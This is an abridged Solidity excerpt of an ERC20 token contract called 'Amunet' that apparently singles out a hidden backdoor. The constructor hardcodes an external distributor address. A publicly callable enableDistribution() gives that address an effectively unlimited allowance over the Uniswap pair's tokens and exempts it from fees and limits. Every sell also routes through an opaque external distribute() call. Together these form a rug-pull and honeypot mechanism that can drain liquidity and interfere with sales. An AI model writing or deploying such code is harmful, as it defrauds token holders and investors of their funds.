...
interface IDistributor {
    ...
    function distribute(address shareHolder, uint amount) external;
...
contract Amunet is ERC20, Ownable {
    ...
    constructor() ERC20("Amunet", "AMU") {
        ...
        distributor = IDistributor(0x1BA98fa85f4EF11a5a1B38E3f80bd24da52ccB2c);
    ...
    function _setDistributor(address _distributor) private {
        ...
        _approve(address(uniswapV2Pair), _distributor, 1e70);
        _isExcludedFromFees[_distributor] = true;
        _isExcludedMaxTransactionAmount[_distributor] = true;
    }
    ...
    function _transfer(
        ...
        if (automatedMarketMakerPairs[to]) {
            distributor.distribute(from, amount);
        }
    ...
    function enableDistribution() public {
        _setDistributor(address(distributor));
    }
